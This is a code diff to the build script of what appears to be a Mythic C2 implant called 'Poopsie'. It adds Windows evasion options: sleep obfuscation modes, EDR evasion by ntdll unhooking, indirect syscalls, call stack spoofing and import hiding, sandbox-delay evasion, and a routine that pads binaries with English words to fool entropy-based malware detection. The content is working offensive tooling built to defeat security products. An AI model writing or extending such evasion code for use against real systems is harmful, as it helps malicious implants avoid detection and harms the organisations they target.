@@ -131,7 +131,7 @@ class Poopsie(PayloadType):
             parameter_type=BuildParameterType.ChooseOne,
             description="Sleep obfuscation technique (Windows x64 only)",
             default_value="none",
-            choices=["none", "ekko"],
+            choices=["none", "ekko", "foliage", "death_sleep"],
             group_name="Sleep Obfuscation Options",
             hide_conditions=[
                 HideCondition(name="architecture", operand=HideConditionOperand.NotEQ, value="x64")
@@ -234,6 +234,38 @@ class Poopsie(PayloadType):
             ],
             supported_os=["Windows"]
         ),
+        BuildParameter(
+            name="evasion",
+            parameter_type=BuildParameterType.ChooseMultiple,
+            description=(
+                "Evasion techniques to reduce binary signatures (Windows only). "
+                "dfr: Dynamic Function Resolution via PEB walk (sensitive APIs resolved at runtime, not in IAT). "
+                "iat_obf: Wipe import directory in memory. "
+                "unhook_ntdll: Remap clean ntdll from disk. "
+                "indirect_syscalls: Use indirect syscall gadgets through ntdll (avoids syscall-from-non-ntdll detection). "
+                "stack_spoof: Spoof call stack frames before API calls (defeats EDR stack walking). "
+                "entropy: Append English-text overlay to lower binary entropy (defeats ML entropy analysis)."
+            ),
+            default_value=[],
+            choices=["dfr", "iat_obf", "unhook_ntdll", "indirect_syscalls", "stack_spoof", "entropy"],
+            required=False,
+            group_name="Evasion Options",
+            supported_os=["Windows"],
+        ),
+        BuildParameter(
+            name="sandbox_evasion",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "Sandbox evasion delay in seconds (0 = disabled). "
+                "Burns time using CPU work and file enumeration instead of sleep calls. "
+                "Sandboxes typically have short execution windows (5-30s). "
+                "Recommended: 10-30 seconds."
+            ),
+            default_value="0",
+            required=False,
+            group_name="Evasion Options",
+            supported_os=["Windows"],
+        ),
     ]
     
     c2_profiles = ["http", "websocket", "httpx", "dns", "tcp", "smb"]
@@ -303,7 +335,7 @@ class Poopsie(PayloadType):
             
             architecture = self.get_parameter("architecture")
             sleep_obfuscation = self.get_parameter("sleep_obfuscation")
-            if architecture == "x86" and sleep_obfuscation == "ekko":
+            if architecture == "x86" and sleep_obfuscation != "none":
                 c2_params["sleep_obfuscation"] = "none"
             else:
                 c2_params["sleep_obfuscation"] = sleep_obfuscation
@@ -414,6 +446,14 @@ class Poopsie(PayloadType):
                     resp.build_message += f"[strip] {strip_cmd} failed: {stderr.decode()}\n"
                     resp.status = BuildStatus.Error
                     return resp
+
+                # Post-compile evasion: entropy padding
+                evasion_options = self.get_parameter("evasion") or []
+                if selected_os == "Windows":
+                    if "entropy" in evasion_options:
+                        self.add_entropy_padding(str(output_path))
+                        resp.build_message += "Evasion: Entropy padding added\n"
+
                 if payload_compression == "upx":
                     upx_cmd = f"/upx --best --lzma {output_path}"
                     proc = await asyncio.create_subprocess_shell(
@@ -468,6 +508,11 @@ class Poopsie(PayloadType):
                     resp.build_message += f"[strip DLL] {strip_cmd} failed: {stderr.decode()}\n"
                     resp.status = BuildStatus.Error
                     return resp
+
+                # Post-compile evasion on DLL before shellcode conversion
+                if "entropy" in evasion_options:
+                    self.add_entropy_padding(str(dll_path))
+                    resp.build_message += "Evasion: Entropy padding added to DLL\n"
 
                 tool = self.get_parameter("tool")
                 command = ""
@@ -602,6 +647,10 @@ class Poopsie(PayloadType):
                 if architecture == "x64":
                     if self.get_parameter("sleep_obfuscation") == "ekko":
                         nim_args.append("-d:sleepObfuscationEkko")
+                    elif self.get_parameter("sleep_obfuscation") == "foliage":
+                        nim_args.append("-d:sleepObfuscationFoliage")
+                    elif self.get_parameter("sleep_obfuscation") == "death_sleep":
+                        nim_args.append("-d:sleepObfuscationDeathSleep")
 
             if use_openssl:
                 if selected_os == "Windows":
@@ -646,6 +695,27 @@ class Poopsie(PayloadType):
             build_messages.append(f"Commands: {len(selected_commands)} compiled")
             if selected_commands:
                 build_messages.append(f"Selected commands: {', '.join(sorted(selected_commands))}")
+            
+            # Evasion compile-time defines
+            evasion_options = self.get_parameter("evasion") or []
+            if selected_os == "Windows" and evasion_options:
+                for evasion in evasion_options:
+                    nim_args.append(f"-d:evasion_{evasion}")
+                build_messages.append(f"Evasion features: {', '.join(evasion_options)}")
+                if "stack_spoof" in evasion_options:
+                    # LTO is incompatible with inline asm used in stack spoofing
+                    nim_args = [a for a in nim_args if a not in ("--passC:-flto", "--passL:-flto")]
+                    build_messages.append("  LTO disabled (incompatible with stack spoof inline asm)")
+
+            sandbox_delay = self.get_parameter("sandbox_evasion") or "0"
+            try:
+                sandbox_seconds = int(sandbox_delay)
+            except ValueError:
+                sandbox_seconds = 0
+            if selected_os == "Windows" and sandbox_seconds > 0:
+                nim_args.append("-d:sandbox_evasion")
+                nim_args.append(f"-d:sandbox_delay_seconds={sandbox_seconds}")
+                build_messages.append(f"Sandbox evasion: {sandbox_seconds}s delay")
             
             if selected_os == "Windows":
                 if architecture == "x64":
@@ -779,6 +849,48 @@ class Poopsie(PayloadType):
             return key_str.encode()
         else:
             return key_str.encode()
+
+    @staticmethod
+    def add_entropy_padding(pe_path: str, target_kb: int = 64):
+        """Append low-entropy English-like text as a PE overlay to reduce 
+        the overall Shannon entropy of the binary."""
+        words = [
+            "the", "be", "to", "of", "and", "a", "in", "that", "have", "I",
+            "it", "for", "not", "on", "with", "he", "as", "you", "do", "at",
+            "this", "but", "his", "by", "from", "they", "we", "say", "her",
+            "she", "or", "an", "will", "my", "one", "all", "would", "there",
+            "their", "what", "so", "up", "out", "if", "about", "who", "get",
+            "which", "go", "me", "when", "make", "can", "like", "time", "no",
+            "just", "him", "know", "take", "people", "into", "year", "your",
+            "good", "some", "could", "them", "see", "other", "than", "then",
+            "now", "look", "only", "come", "its", "over", "think", "also",
+            "back", "after", "use", "two", "how", "our", "work", "first",
+            "well", "way", "even", "new", "want", "because", "any", "these",
+            "give", "day", "most", "us", "great", "between", "need", "large",
+            "under", "never", "each", "much", "begin", "those", "around",
+            "every", "still", "should", "help", "call", "world", "long",
+            "system", "program", "service", "start", "process", "application",
+            "function", "return", "value", "data", "information", "support",
+            "version", "number", "name", "file", "display", "output", "input",
+            "control", "change", "request", "response", "error", "message",
+        ]
+        import random
+        rng = random.Random(42)
+        pad_size = target_kb * 1024
+        padding = []
+        current_size = 0
+        while current_size < pad_size:
+            sentence_len = rng.randint(8, 20)
+            sentence = " ".join(rng.choice(words) for _ in range(sentence_len))
+            sentence = sentence.capitalize() + ".\r\n"
+            padding.append(sentence)
+            current_size += len(sentence)
+        pad_bytes = "".join(padding).encode("ascii")[:pad_size]
+        try:
+            with open(pe_path, "ab") as f:
+                f.write(pad_bytes)
+        except Exception:
+            pass
 
     def normalize_c2_config(self, config):
         """Normalize TOML-parsed config to match JSON structure expectations.
